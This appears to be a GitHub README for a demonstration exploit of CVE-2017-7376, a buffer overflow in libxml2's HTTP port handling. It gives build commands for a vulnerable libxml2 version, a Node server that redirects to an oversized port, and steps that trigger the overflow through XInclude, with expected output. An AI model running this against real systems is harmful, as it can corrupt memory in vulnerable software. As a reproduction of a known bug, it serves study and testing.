# libxml2-exploit
An example exploit for CVE-2017-7376

# Install
Download this repo and a vulnerable version of libxml2, e.g. v2.7.7:
```
git clone https://github.com/brahmstaedt/libxml2-exploit.git
cd libxml2-exploit
wget https://github.com/GNOME/libxml2/archive/v2.7.7.zip
unzip v2.7.7.zip
mv libxml2-2.7.7/ libxml2
```

# Setup

```
cd libxml2
```

## prepare libxml2

To make the success of the exploit more visible, add code to detect the buffer
overflow to libxml2. Not needed, if you have other means of visibility, such
as the application crashing.

```
git apply ../nanohttp.patch
```

## build libxml2

```
./autogen.sh --prefix=$(pwd)/ --without-python
make
make install
```

In case of the following error:
```
aclocal: warning: autoconf input should be named 'configure.ac', not 'configure.in'
```

Replace in configure.in `AM_C_PROTOTYPES` with `dnl AM_C_PROTOTYPES`, e.g. like this:
```
sed 's:AM_C_PROTOTYPES:dnl AM_C_PROTOTYPES:' configure.in -i
```

Go back
```
cd ..
```

## prepare web server
This exploit requires a web server responding with a redirect to a new URL with
a port number greater than 5 digits an below int32max (2147483648 = 2^32/2).

Start server (requires node JS and port 127.0.0.1:8080 to be unused):
```
node http.js &
```

Test web server; should complain about invalid port number 2147426192:
```
wget localhost:8080
```

# Compile

```
make
```

# Run
```
./run.sh
```

Expected output:
```
Buffer overflow is detected
I/O warning : failed to load HTTP resource
buffer_overflow.xml:4: element include: XInclude error : could not load http://localhost:8080/dummy.xml, and no fallback was found
Failed to process include buffer_overflow.xml
```

# To Do
This demo exploit requires the main program to execute `xmlXIncludeProcess()` to reach the faulty code in
libxml2, which is not likely used in many actual implementations. But then nanohttp.c mentions in the comment
that it is a `minimalist HTTP GET implementation to fetch external subsets` which may offer another path of exploitation.
